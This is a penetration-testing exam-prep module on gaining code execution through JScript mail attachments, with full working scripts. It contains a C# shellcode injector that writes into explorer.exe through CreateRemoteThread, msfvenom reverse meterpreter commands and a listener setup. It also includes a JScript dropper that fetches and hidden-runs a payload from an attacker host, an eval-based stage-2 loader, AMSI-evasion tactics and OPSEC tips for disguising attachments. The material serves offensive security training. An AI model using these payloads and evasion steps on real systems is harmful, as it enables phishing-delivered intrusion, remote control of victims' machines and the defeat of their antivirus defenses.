::: warning Authorized use only
For the official OSEP labs/exam, or systems you are written-authorized to test. Do not use against unauthorized systems.
:::

# 03 · JScript / DotNetToJScript client-side code execution

> **Covers scenarios:** 9–10
>
> **Prerequisites:** target still has Windows Script Host (`cscript` / `wscript`); target has .NET Framework (2.0/3.5 or 4.x); attacker has `msfvenom`, an HTTP service, and an MSF listener; a tool host that can run .NET to generate DotNetToJScript / SuperSharpShooter artifacts (Windows, or Linux + mono/python)

## Background: why WSH can bypass “EXE restricted”

- Scenarios 9/10 both assume **script attachments can run, but a standalone EXE path is unreliable** (AppLocker / AV / download-and-execute policy). WSH scripts (`.js`) are interpreted by `cscript.exe` / `wscript.exe` and are not limited by default AppLocker EXE rules or PowerShell ExecutionPolicy — a common reason “scripts work, EXEs do not.”
- WSH is an **unmanaged host**: `cscript/wscript` itself is not a .NET process. To run a C# second stage from JScript you need a bridge such as DotNetToJScript: serialize a C# assembly into the script, deserialize it at runtime inside the WSH process, and trigger a `[ComVisible]` type’s constructor/entry — **no EXE on disk**.
- Bitness constraints (the easiest pitfall in this module):
  - On x64 Windows, `C:\Windows\System32\cscript.exe|wscript.exe` is a 64-bit process; under `C:\Windows\SysWOW64\` they are 32-bit. Mail/double-click defaults to the 64-bit host.
  - A 64-bit host can only load **x64 or AnyCPU** assemblies into the CLR; a 32-bit host can only load **x86 or AnyCPU**. Shellcode injected into a target process (e.g. `explorer.exe`) must match the **target process** bitness.
- .NET version constraints: DotNetToJScript `--ver=v2` needs .NET 2.0/3.5 (not enabled by default on Win8+; turn on the “.NET Framework 3.5” feature first); `--ver=v4` needs .NET 4.x (present by default on modern Windows). For the exam default to **v4** unless the target clearly has only 2.0.
- AMSI (scenario 10): on Windows 10+, AMSI scans **content dynamically fed into the script engine** (`eval` / `Execute`, dynamically concatenated script text). A pure download dropper’s file body is “harmless logic” and can run; once the second stage is a large embedded blob or attack content is `eval`’d live, it may be blocked. Binary/serialized base64 is opaque to the engine, so DotNetToJScript artifacts often pass content scanning.

---

## Scenario 9: JScript in a mail attachment runs, but ordinary EXEs are restricted

**Situation**: Script entry works; running a standalone EXE does not → bridge with JScript + a C# second stage, keep execution inside WSH/.NET, avoid dropping and launching an EXE.

**Assumptions**:
- User opens the `.js` in the attachment (or from a URL); WSH is available; `cscript/wscript` is not disabled by AppLocker (script rules usually allow — confirm with scenario 18–24 enumeration first).
- Target has .NET Framework 4.x (default v4 path holds).
- You have: `msfvenom`, MSF listener, HTTP hosting; a tool host to run DotNetToJScript/SuperSharpShooter and generate artifacts.
- You know target process bitness (mail double-click → x64 host; for a 32-bit host push the payload under SysWOW64 or use `cscript //E:jscript` explicitly).

**Prepare (attacker side)**:
1. Generate shellcode (x64, for injecting a 64-bit process):
   ```bash
   msfvenom -p windows/x64/meterpreter/reverse_https LHOST=LHOST LPORT=LPORT EXITFUNC=thread -f csharp
   ```
   If the host is 32-bit (x86 target, or you must use the SysWOW64 host), use `windows/meterpreter/reverse_https` (x86) instead.
2. Paste step-1 output into the `PAYLOAD` byte array in `m03-dotnettojscript-payload.cs` and compile on the tool host:
   ```bat
   C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /target:library /platform:anycpu /out:payload.dll m03-dotnettojscript-payload.cs
   ```
3. Generate the JScript bridge artifact (serialized assembly; activated inside WSH at runtime):
   ```bat
   DotNetToJScript.exe .\payload.dll --lang=Jscript --ver=v4 -o runner.js
   ```
   Without a Windows tool host, use SuperSharpShooter (pure Python; can take raw shellcode directly):
   ```bash
   msfvenom -p windows/x64/meterpreter/reverse_https LHOST=LHOST LPORT=LPORT -f raw -o shell.bin
   ./SuperSharpShooter.py --stageless --dotnetver 4 --rawscfile shell.bin --payload js --output payload
   # artifact: payload.js
   ```
4. Start listener and hosting:
   ```bash
   sudo msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_https; set lhost LHOST; set lport LPORT; exploit"
   python3 -m http.server 80
   ```
5. On a **local / lab target**, validate once with `cscript //nologo runner.js` (see Verify) before delivering.

**Procedure**:
1. Confirm script entry and host bitness (use the host-info section of `m03-wsh-amsi-probe.js`):
   ```bat
   cscript //nologo probe.js        :: prints HOST_ARCH / PROCESSOR_ARCHITECTURE
   ```
2. Deliver `runner.js`: mail attachment, or URL + lure (reuse HTA/link techniques from scenarios 6–8). Before delivery, rename tool fingerprints in `runner.js` (e.g. `TestClass` / project names) to neutral names — see OPSEC.
3. On the target (exam “open the attachment” usually means double-click → 64-bit `wscript`; confirm with cscript when needed):
   ```bat
   cscript //nologo runner.js
   ```
4. Listener receives a `windows/x64/meterpreter` session; move to the next stage (migrate to a stable process, then continue enumeration).
5. If the script entry is “download then execute” and the target **can** run scripts but not EXEs: `m03-simple-dropper.js` pulls the second-stage **script/data file** (`RUN_AFTER_DOWNLOAD=0`), then a trusted host runs it — do not let it `Run(pay.exe)` directly.

**Scripts used**:
| Script | Purpose | Key parameters |
|---|---|---|
| `m03-dotnettojscript-payload.cs` | C# second stage (`[ComVisible]` class; injects shellcode in the constructor) | `PAYLOAD` (msfvenom csharp bytes), `TARGET_PROCESS` |
| `m03-dotnettojscript-loader.js` | Skeleton/paste container for DotNetToJScript output (`runner.js`) + preflight | generation commands in the file header |
| `m03-supersharpshooter-loader.js` | Split loader for SuperSharpShooter output (read `payload.js` then run) | `STAGE2_JS` path |
| `m03-simple-dropper.js` | Pure download/save (transport layer for script-entry scenarios) | `URL`, `DROP_PATH`, `RUN_AFTER_DOWNLOAD` |

#### `m03-dotnettojscript-payload.cs` {#m03-dotnettojscript-payload-cs}

````csharp
/*
 * Purpose: C# second-stage payload — [ComVisible] class that injects shellcode
 *      into a chosen process from the constructor. Serialized into JScript by
 *      DotNetToJScript / SuperSharpShooter; deserialized and activated inside
 *      the WSH process with no EXE on disk (scenario 9 main path).
 * Scenario: 9, 10 (cheat sheet JScript > Meterpreter Loader with DotNetToJScript)
 * Dependencies: .NET Framework SDK csc.exe (compile on a Windows tool host);
 *      runtime needs the matching CLR (v4 by default). Injected target process
 *      must exist and match bitness.
 * Usage:
 *  1) Generate shellcode (x64 into a 64-bit process):
 *       msfvenom -p windows/x64/meterpreter/reverse_https LHOST=LHOST LPORT=LPORT EXITFUNC=thread -f csharp
 *     For x86 targets / 32-bit hosts use: -p windows/meterpreter/reverse_https ...
 *  2) Replace the PAYLOAD array below with that byte[] output.
 *  3) Compile on the tool host (AnyCPU works with 32/64-bit hosts; final
 *     bitness is driven by the injected target process):
 *       C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /target:library /platform:anycpu /out:payload.dll m03-dotnettojscript-payload.cs
 *  4) Generate bridge JS and deliver (see docs/03 scenario 9 step 3):
 *       DotNetToJScript.exe .\payload.dll --lang=Jscript --ver=v4 -o runner.js
 * Placeholders: PAYLOAD (msfvenom -f csharp bytes), TARGET_PROCESS (default explorer)
 * Test status: Not compiled / not lab-tested; structure matches the cheat sheet
 *     TestClass.cs — compile on a tool host and verify on a lab target before use.
 */

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

[ComVisible(true)]
public class Payload
{
    // Inject target: a long-lived process matching local architecture / logon session.
    // x64 shellcode -> 64-bit explorer.exe; x86 shellcode -> 32-bit process (e.g. under SysWOW64).
    private const string TARGET_PROCESS = "explorer";

    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress,
        uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
        byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes,
        uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
        uint dwCreationFlags, IntPtr lpThreadId);

    public Payload()
    {
        // Paste the full msfvenom -f csharp byte[] here (replace the placeholder below)
        byte[] buf = new byte[] {
            0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00, /* PAYLOAD ... */
            /* ... full shellcode bytes ... */
        };

        // 1. Open inject target (0x001F0FFF = PROCESS_ALL_ACCESS)
        Process[] procs = Process.GetProcessesByName(TARGET_PROCESS);
        if (procs.Length == 0)
        {
            // Fail with feedback: if no target process, inject self or change to another resident name
            return;
        }
        IntPtr hProcess = OpenProcess(0x001F0FFF, false, procs[0].Id);
        if (hProcess == IntPtr.Zero) return;

        // 2. Allocate RWX memory in the target
        //    0x3000 = MEM_COMMIT|MEM_RESERVE, 0x40 = PAGE_EXECUTE_READWRITE
        IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)buf.Length, 0x3000, 0x40);
        if (addr == IntPtr.Zero) return;

        // 3. Write shellcode and start a remote thread
        IntPtr written;
        WriteProcessMemory(hProcess, addr, buf, buf.Length, out written);
        CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
    }

    // Alternate entry: besides the constructor, DotNetToJScript-serialized classes
    // can expose methods for the script side to call explicitly
    public void RunProcess(string path)
    {
        Process.Start(path);
    }
}
````

#### `m03-wsh-amsi-probe.js` {#m03-wsh-amsi-probe-js}

````javascript
/*
 * Purpose: WSH-host AMSI lab probe (scenario 10). Two parts:
 *  (A) Report host info: script-host path/bitness, OS architecture, whether
 *      .NET v4/v2 directories exist — these decide whether DotNetToJScript /
 *      SuperSharpShooter artifacts can load;
 *  (B) Dynamic-content experiment: eval/load a string known to be AMSI-flagged
 *      and a plain string; use exceptions and survival to infer whether this
 *      host has AMSI content scanning. Lab-only for locating the block point;
 *      not a final payload.
 * Scenario: 10 (course §12.6; PS AMSI bypasses do not move into WSH —
 *      probe the host first, then choose a path)
 * Dependencies: Windows Script Host (cscript/wscript); results depend on the
 *      local AV/AMSI provider (with no third-party AV, Defender on/off drives
 *      output) — retest in a same-class environment as the target.
 * Usage: cscript //nologo m03-wsh-amsi-probe.js
 * Placeholders: none (read-only host info + lab strings; change
 *      EVAL_TEST_CONTENT as needed)
 * Test status: JS syntax checked (node --check); PASS/BLOCKED judgment needs
 *      a real Windows + Defender environment — cannot reproduce on this host.
 */

// ===================== (A) Host info =====================
var fso = new ActiveXObject("Scripting.FileSystemObject");
var shell = new ActiveXObject("WScript.Shell");
var env = shell.Environment("Process");
var windir = env("WINDIR");

WScript.Echo("== (A) Host info ==");
WScript.Echo("  Script host     : " + WScript.FullName);          // ...cscript.exe / wscript.exe
WScript.Echo("  OS architecture : " + env("PROCESSOR_ARCHITECTURE"));
if (env("PROCESSOR_ARCHITECTURE") === "x86" &&
    env("PROCESSOR_ARCHITEW6432") === "AMD64") {
    WScript.Echo("  -> This process is 32-bit (x64 OS): payload needs x86/AnyCPU");
}
WScript.Echo("  amsi.dll(64)    : " +
    (fso.FileExists(windir + "\\System32\\amsi.dll") ? "present" : "missing"));
WScript.Echo("  amsi.dll(32)    : " +
    (fso.FileExists(windir + "\\SysWOW64\\amsi.dll") ? "present" : "missing"));
WScript.Echo("  .NET v4 (F64)   : " +
    (fso.FolderExists(windir + "\\Microsoft.NET\\Framework64\\v4.0.30319") ? "present" : "missing"));
WScript.Echo("  .NET v2 (F64)   : " +
    (fso.FolderExists(windir + "\\Microsoft.NET\\Framework64\\v2.0.50727") ? "present" : "missing"));

// ===================== (B) Dynamic content experiment =====================
WScript.Echo("");
WScript.Echo("== (B) Dynamic content (eval) experiment ==");
WScript.Echo("  Results depend on local AV/AMSI: PASS=ran, BLOCKED=blocked/killed, ERROR=other");

// Plain string: should not trigger content scanning
try {
    eval("var _t_plain = 'hello world';");
    WScript.Echo("  [1] Plain-string eval        : PASS");
} catch (e1) {
    WScript.Echo("  [1] Plain-string eval        : ERROR (" + e1.message + ")");
}

// String known to be AMSI-flagged (lab purpose, not a real payload):
// This content should not produce any effect — only observe whether it is blocked.
var EVAL_TEST_CONTENT = "var x = 'Invoke-Mimikatz';"; // replace with a minimal signature fragment of content you plan to deliver
try {
    eval(EVAL_TEST_CONTENT);
    WScript.Echo("  [2] Signature-string eval    : PASS (host did not block this content, or AMSI inactive)");
} catch (e2) {
    WScript.Echo("  [2] Signature-string eval    : BLOCKED/ERROR (" + e2.message + ")");
    WScript.Echo("      -> Host scans dynamic content; design delivery to avoid eval'ing attack text");
}

WScript.Echo("");
WScript.Echo("== Quick conclusions ==");
WScript.Echo("  Host bitness + .NET dirs -> decide DotNetToJScript --ver and platform");
WScript.Echo("  [2] if BLOCKED      -> Scenario 10: split stage 2 / new process / change host (mshta/Office)");
WScript.Echo("  [2] if PASS         -> Block may be file body / network, not dynamic content — keep bisecting");

WScript.Quit(0);
````

#### `m03-simple-dropper.js` {#m03-simple-dropper-js}

````javascript
/*
 * Purpose: Minimal JScript downloader — pull a file from attacker HTTP to the
 *      target and save it; optionally execute. Transport layer for scenarios
 *      9/10 when "script entry works": download stage-2 script/data and avoid
 *      putting attack logic in the attachment body (scenario 10 A/B split,
 *      stage A).
 * Scenario: 9, 10 (cheat sheet JScript > Simple Meterpreter Dropper)
 * Dependencies: Windows Script Host (cscript / wscript); target can reach
 *      attacker HTTP; MSXML2.XMLHTTP and ADODB.Stream are built-in.
 * Usage:
 *   Target (prefer cscript for stdout; wscript double-click uses message boxes):
 *     cscript //nologo m03-simple-dropper.js
 *   Attacker: python3 -m http.server 80   (host the PAYLOAD file)
 * Placeholders: URL=http://LHOST/PAYLOAD   DROP_PATH=C:\Users\Public\PAYLOAD
 *      RUN_AFTER_DOWNLOAD=0/1 (1 = run downloaded .js with a new cscript process
 *      for A/B separation)
 * Test status: JS syntax checked with node --check; not tested under Windows
 *     WSH; structure follows the cheat sheet Simple Meterpreter Dropper —
 *     verify in the lab.
 * Note: this file only downloads and (optionally) runs files you yourself host
 *     for authorized testing.
 */

var URL = "http://LHOST/PAYLOAD";          // required: attacker host URL + filename
var DROP_PATH = "C:\\Users\\Public\\PAYLOAD"; // required: absolute save path (match URL filename for stability)
var RUN_AFTER_DOWNLOAD = 0;                // 1 = after download, run DROP_PATH with a new cscript process

var http = new ActiveXObject("MSXML2.XMLHTTP");

WScript.Echo("[*] GET " + URL);
http.Open("GET", URL, false);              // synchronous — blocks until done
http.Send();

if (http.Status !== 200) {
    WScript.Echo("[!] HTTP request failed, status: " + http.Status);
    WScript.Quit(1);
}

// ResponseBody is a binary array; ADODB.Stream writes bytes to disk (Type=1 = binary)
var stream = new ActiveXObject("ADODB.Stream");
stream.Open();
stream.Type = 1;
stream.Write(http.ResponseBody);
stream.Position = 0;
stream.SaveToFile(DROP_PATH, 2);           // 2 = overwrite if exists
stream.Close();

var fso = new ActiveXObject("Scripting.FileSystemObject");
if (!fso.FileExists(DROP_PATH)) {
    WScript.Echo("[!] File was not saved: " + DROP_PATH);
    WScript.Quit(1);
}
WScript.Echo("[+] Saved " + DROP_PATH + " (" + fso.GetFile(DROP_PATH).Size + " bytes)");

if (RUN_AFTER_DOWNLOAD === 1) {
    // Scenario 10: run downloaded stage B in a "new process" to avoid continuing
    // complex content inside the attachment process's scan context
    var shell = new ActiveXObject("WScript.Shell");
    var cmd = 'cscript //nologo "' + DROP_PATH + '"';
    WScript.Echo("[*] Exec: " + cmd);
    shell.Run(cmd, 0, false);              // 0 = hidden window, do not wait
}
WScript.Quit(0);
````

#### `m03-dotnettojscript-loader.js` {#m03-dotnettojscript-loader-js}

````javascript
/*
 * Purpose: Skeleton/paste container for DotNetToJScript bridge artifacts +
 *      host preflight. DotNetToJScript.exe serializes a C# assembly into a
 *      full runner.js (hundreds of lines of base64). This file: (a) records
 *      the standard generation commands; (b) preflights host bitness/.NET
 *      before delivery; (c) when hand-assembling, paste the tool output into
 *      the paste zone below.
 * Scenario: 9, 10 (cheat sheet JScript > Meterpreter Loader with DotNetToJScript)
 * Dependencies: Windows tool host + DotNetToJScript.exe; target WSH + .NET
 *      (v4 or v2).
 * Usage:
 *  1) Generate the full artifact (artifact runs standalone — this file optional):
 *       DotNetToJScript.exe .\payload.dll --lang=Jscript --ver=v4 -o runner.js
 *  2) Local preflight (put artifact beside this file and run this file for host info):
 *       cscript //nologo m03-dotnettojscript-loader.js
 *  3) If hand-pasting: paste the entire tool output between PASTE_BEGIN/PASTE_END
 *     below, save, then run with cscript.
 * Placeholders: none (host info is read automatically); paste zone is tool
 *      output — do not hand-edit the base64.
 * Test status: host-preflight logic JS-syntax checked (node --check);
 *     artifact generation/activation needs a Windows lab environment.
 */

// ===================== Host preflight (read-only; does not change the artifact) =====================
var fso = new ActiveXObject("Scripting.FileSystemObject");
var env = new ActiveXObject("WScript.Shell").Environment("Process");

WScript.Echo("[*] Host            : " + WScript.FullName);
WScript.Echo("[*] OS architecture : " + env("PROCESSOR_ARCHITECTURE"));
// Host bitness decides which assembly platforms can load: 64-bit host -> x64/AnyCPU; 32-bit host -> x86/AnyCPU
if (env("PROCESSOR_ARCHITECTURE") === "x86" &&
    env("PROCESSOR_ARCHITEW6432") === "AMD64") {
    WScript.Echo("[!] This process is 32-bit (running on x64 OS) — payload needs x86 or AnyCPU");
}

// .NET version directory probe: v4 usually present; v2/v3.5 needs the feature enabled
var windir = env("WINDIR");
var net4 = windir + "\\Microsoft.NET\\Framework64\\v4.0.30319";
var net2 = windir + "\\Microsoft.NET\\Framework64\\v2.0.50727";
WScript.Echo("[*] .NET v4 dir     : " + (fso.FolderExists(net4) ? "present" : "missing"));
WScript.Echo("[*] .NET v2 dir     : " + (fso.FolderExists(net2) ? "present" : "missing"));
if (!fso.FolderExists(net4) && !fso.FolderExists(net2)) {
    WScript.Echo("[!] No .NET Framework directories found; DotNetToJScript v4/v2 artifacts cannot run");
    WScript.Quit(1);
}

// ===================== Paste zone =====================
// Paste the full JS generated by DotNetToJScript here (including its own
// var serialized_obj = "..." and later deserialize/activate code), and remove
// the two placeholder lines below.
// Match artifact to host bitness/.NET version (v2 artifacts need .NET 2.0/3.5).
// PASTE_BEGIN
WScript.Echo("[*] Paste zone empty: run DotNetToJScript first to generate the artifact,");
WScript.Echo("[*] or deliver the runner.js artifact as the attachment directly (recommended; do not hand-edit).");
WScript.Echo("[*] Host info above confirms whether artifact platform (--ver / compile platform) matches.");
// PASTE_END

WScript.Quit(0);
````

#### `m03-supersharpshooter-loader.js` {#m03-supersharpshooter-loader-js}

````javascript
/*
 * Purpose: "Split stage-2" loader for SuperSharpShooter artifacts (scenario 10
 *      lab shape). Attachment contains only this file (clean body); at runtime
 *      it reads same-dir / given-path payload.js (SuperSharpShooter stage 2)
 *      and executes it. Useful for swapping artifacts quickly on a target and
 *      for testing whether "A/B split + new process" dodges content scanning.
 * Scenario: 10, 9 alternate (cheat sheet JScript > Meterpreter with SuperSharpShooter)
 * Dependencies: target WSH; payload.js from SuperSharpShooter (tool-host Python is enough):
 *      msfvenom -p windows/x64/meterpreter/reverse_https LHOST=LHOST LPORT=LPORT -f raw -o shell.bin
 *      ./SuperSharpShooter.py --stageless --dotnetver 4 --rawscfile shell.bin --payload js --output payload
 * Usage:
 *  1) Place generated payload.js beside this file on the target (pull via
 *     m03-simple-dropper.js from attacker hosting, or a second attachment).
 *  2) On the target run:
 *       cscript //nologo m03-supersharpshooter-loader.js
 * Placeholders: STAGE2_JS=payload.js (relative/absolute path)
 * Test status: JS syntax checked (node --check); actual load/activate needs
 *     a lab environment — if this shape is still blocked, see docs/03
 *     scenario 10 failure branches (change host / artifact options).
 */

var STAGE2_JS = "payload.js";      // same name as generated artifact; may be absolute C:\\...\\payload.js

var fso = new ActiveXObject("Scripting.FileSystemObject");
if (!fso.FileExists(STAGE2_JS)) {
    WScript.Echo("[!] Stage 2 not found: " + STAGE2_JS);
    WScript.Echo("[*] Download with the dropper first, or place payload.js beside this file");
    WScript.Quit(1);
}

WScript.Echo("[*] Reading and executing stage 2: " + STAGE2_JS);

// Read entire file then eval: content is mostly opaque base64 from the tool.
// Note: eval is "dynamically executed content"; if target AMSI covers this host
// and the artifact text has signatures, this shape may be blocked — that is
// exactly the experiment. If blocked, switch to a new independent process /
// different artifact / different host.
var textStream = fso.OpenTextFile(STAGE2_JS, 1, false, -1); // 1=read-only, -1=system default (ASCII-compatible)
var stage2 = textStream.ReadAll();
textStream.Close();

try {
    eval(stage2);
    WScript.Echo("[+] Stage 2 executed (no exception)");
} catch (err) {
    // Fail with feedback: distinguish "content blocked/exception" vs "host mismatch"
    WScript.Echo("[!] Stage 2 execution exception: " + err.message);
    WScript.Echo("[*] If this is AMSI/AV, switch to an independent new process or a different artifact (see docs/03 scenario 10)");
    WScript.Quit(2);
}

WScript.Quit(0);
````

**Validation**: a meterpreter session on the listener means success. For local pre-validation note — `runner.js` activates .NET **inside the process that runs it**: with `cscript //nologo` on a 64-bit host you must use x64 shellcode; if injecting `explorer.exe`, confirm that process exists and matches bitness, otherwise `OpenProcess/CreateRemoteThread` fails silently with no session (script has little echo — judge from the listener).

**Failure branches and alternatives**:
1. Double-click no callback, cscript also no callback → check bitness first: `PROCESSOR_ARCHITECTURE=AMD64` but inject target is a 32-bit process (SysWOW64 explorer or an Office child) fails silently. Fix: inject a same-bitness target (e.g. x64 shellcode + 64-bit `explorer.exe`), or compile the payload AnyCPU and keep shellcode bitness tied to the inject target.
2. `.NET 3.5/v2` artifact on Win10 reports “not enabled” → regenerate with `--ver=v4`; conversely, if the target is old and only has 2.0, a v4 artifact will not load — need a v2 artifact.
3. `runner.js` is killed by AV as soon as it runs → scenario 10 territory: probe with `m03-wsh-amsi-probe.js`, then try a SuperSharpShooter artifact with AMSI options, or change how stage 2 executes (see scenario 10 failure branches).
4. No tool host / no DotNetToJScript.exe → use the SuperSharpShooter path (step 3 alternate); artifact is still a single-file `payload.js`.
5. Target rejects “attachment scripts” but allows “click a URL” → wrap the same JScript in `mshta http://URL/payload.hta` (see M02).

**Exam / OPSEC notes**:
- **Three bitness points must agree**: host process ↔ assembly platform ↔ inject-target bitness. Run `wmic os get osarchitecture` / `echo %PROCESSOR_ARCHITECTURE%` before choosing the payload.
- Pre-generated artifacts contain tool default strings (`TestClass`, project GUIDs, etc.) — globally replace with neutral names of the same length before delivery.
- DotNetToJScript runs inside `wscript`; session parent is `wscript.exe` — `migrate` immediately to `explorer`/`svchost`-class processes so closing the window does not kill the session.
- For attachment scenarios keep filename/subject “benign” for the user’s role; some mail gateways block `.js` — keep a URL delivery line ready.
- All scripts in this module are for authorized labs only; do not retry the same signed artifact repeatedly on one target (behavior detection and later-scenario pollution).

---

## Scenario 10: JScript can run simple content, but complex scripts are scanned and blocked

**Situation**: On the same script entry, a simple dropper runs; adding a .NET bridge / richer stage-2 content gets blocked. AMSI bypasses proven in PowerShell **do not move into WSH** — PS bypasses rely on reflection inside a PS runspace, while WSH is an unmanaged host. Clarify the host difference before acting.

**Assumptions**:
- Confirmed “content scanned and blocked,” not “entry sealed” (a simple script on the same entry that still runs rules out entry problems; reuse scenario 8’s “do not assume AV first” idea — do timing/segment experiments first).
- Target is Windows 10+ with AMSI covering the script engine (default Defender case); the block may be file-body parsing or `eval`/dynamic content.
- You have a lab target that reproduces “simple works, complex blocked” for bisecting which content chunk triggers.

**Prepare (attacker side)**:
1. Prepare lab script `m03-wsh-amsi-probe.js`; run once locally and once on the target; record host bitness, .NET directories, and PASS/BLOCKED for the dynamic-exec section:
   ```bat
   cscript //nologo m03-wsh-amsi-probe.js
   ```
2. Prepare two-stage materials under a “split” design:
   - Stage A (attachment/URL `.js`): download / read / harmless scheduling only — clean body, passes parse scanning.
   - Stage B (stage 2): DotNetToJScript or SuperSharpShooter artifact, dropped locally then pulled/executed by A; or a second independent attachment.
3. If you still need “complex content,” regenerate with SuperSharpShooter’s AMSI-related options (see its README evasion flags) — do not hand-write PS-style bypasses.

**Procedure**:
1. Locate the block: write two minimal variants — variant 1 only `WScript.Echo`/download; variant 2 adds only the “load .NET bridge” call on top of variant 1. If 1 works and 2 dies, the block is in the bridge content, not the dropper itself.
2. Split stage 2: attachment holds only stage A (`m03-simple-dropper.js` download logic, `RUN_AFTER_DOWNLOAD=0`); host `payload.js` (SuperSharpShooter artifact) at `http://URL/payload.js`:
   ```js
   // m03-simple-dropper.js params: URL=http://URL/payload.js  DROP_PATH=C:\\Users\\Public\\payload.js  RUN_AFTER_DOWNLOAD=1
   ```
   With `RUN_AFTER_DOWNLOAD=1`, `WScript.Shell.Run('cscript //nologo "' + DROP_PATH + '"', 0, false)` runs stage B in a **new process** (new process can escape “dirty content already loaded / scan context already triggered” inside the host; A and B each look relatively benign alone).
3. Carry stage B as binary/serialized form (DotNetToJScript or SuperSharpShooter base64 serialization is opaque text to the engine) — avoid writing attack logic as engine-parseable script text.
4. If stage B is still blocked, use the `m03-supersharpshooter-loader.js` load shape: it reads same-dir `payload.js` then runs, so you can try different artifacts on the target without repeatedly changing the attachment.
5. Fallback: return to scenario 9’s HTA/mshta host for a different scan context (`mshta` JScript goes through the mshtml engine; AMSI integration differs from cscript). This is “change host to bypass” — record which line works on the target and use that line on the exam.

**Scripts used**:
| Script | Purpose | Key parameters |
|---|---|---|
| `m03-wsh-amsi-probe.js` | Host info + PASS/BLOCKED experiment on dynamic content | none; `EVAL_TEST_CONTENT` editable |
| `m03-simple-dropper.js` | Download stage B and run it in a new cscript process (A/B split) | `URL`, `DROP_PATH`, `RUN_AFTER_DOWNLOAD` |
| `m03-supersharpshooter-loader.js` | Split stage-2 load experiment | `STAGE2_JS` |
| `m03-dotnettojscript-loader.js`, `m03-dotnettojscript-payload.cs` | Bridge artifact container and C# stage 2 | see scenario 9 |

**Validation**: in the probe, the “known signature string” section is BLOCKED while the plain string is PASS → that host has AMSI scanning; design for “more opaque content is better.” Final success criterion is a listener session. The probe itself may pop AV alerts — expected (the probe’s job is to expose the block).

**Failure branches and alternatives**:
1. Adding the bridge dies; pure download works → bridge content is what is scanned. Fix: A/B split + new process (step 2); regenerate the bridge with SuperSharpShooter AMSI options.
2. Even stage A’s download domain/IP is blocked → not AMSI content, but network (URL reputation/proxy); switch to HTTPS + normal UA/cert (scenario 31), or give the full artifact as a mail attachment per scenario 9.
3. Content dynamically built with `eval` is blocked (probe eval section BLOCKED) → design to **avoid eval’ing attack text in WSH**: stage 2 always uses serialized/binary form or an independent process; keep the script body static and harmless.
4. PS-usable AMSI bypass code errors/no-ops in JScript → do not port it: WSH cannot `Add-Type`/reflect-patch in the same runspace like PS; either use a generator with AMSI handling (SuperSharpShooter options), or change host (mshta/Office, see M01/M02) — do not improvise an in-memory patch on the spot.
5. Repeated blocks with no location → bisect with the probe (add one chunk only, then the other); decide whether it is a “content signature” or “behavior (network/process)” before changing wrappers.

**Exam / OPSEC notes**:
- Scenario 8’s lesson applies: **confirm it is a block, not a timing/lifecycle issue** — after a split download/execute, check whether the file landed and the process started before concluding “killed.”
- The probe “tries malicious content” on the target and may leave log signatures; use one-shot filenames in the lab; never treat the probe as the final payload.
- AMSI blocks **dynamic content**, not filenames/icons — do not waste time on disguise filenames; spend effort on “opaque body, segments, change host.”
- Record each variant’s result on the target (which host, which content, whether it passed); on the exam pick a known-good combination from notes instead of burning time trial-and-error.

---

## Module quick reference

```bash
# Generate and compile (scenario 9)
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=LHOST LPORT=LPORT EXITFUNC=thread -f csharp   # paste bytes into payload.cs
csc /target:library /platform:anycpu /out:payload.dll m03-dotnettojscript-payload.cs                   # Windows tool host
DotNetToJScript.exe payload.dll --lang=Jscript --ver=v4 -o runner.js                                    # bridge JS
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=LHOST LPORT=LPORT -f raw -o shell.bin          # SuperSharpShooter alternate
./SuperSharpShooter.py --stageless --dotnetver 4 --rawscfile shell.bin --payload js --output payload    # artifact payload.js

# Listener and hosting
sudo msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_https; set lhost LHOST; set lport LPORT; exploit"
python3 -m http.server 80

# Target side
cscript //nologo runner.js                # local pre-validation / no-window echo run
echo %PROCESSOR_ARCHITECTURE%            # confirm bitness before choosing shellcode
cscript //nologo m03-wsh-amsi-probe.js   # scenario 10: host info + AMSI experiment
```

## Related script list

| Script | ~Lines | Notes |
|---|---|---|
| `m03-simple-dropper.js` | 60 | Download/save/optional exec (transport; A/B split) |
| `m03-dotnettojscript-loader.js` | 90 | DotNetToJScript artifact skeleton/paste container + preflight |
| `m03-supersharpshooter-loader.js` | 90 | SuperSharpShooter split loader (lab) |
| `m03-wsh-amsi-probe.js` | 100 | WSH host info + AMSI dynamic-content experiment |
| `m03-dotnettojscript-payload.cs` | 110 | C# stage 2 (`[ComVisible]` inject class) |
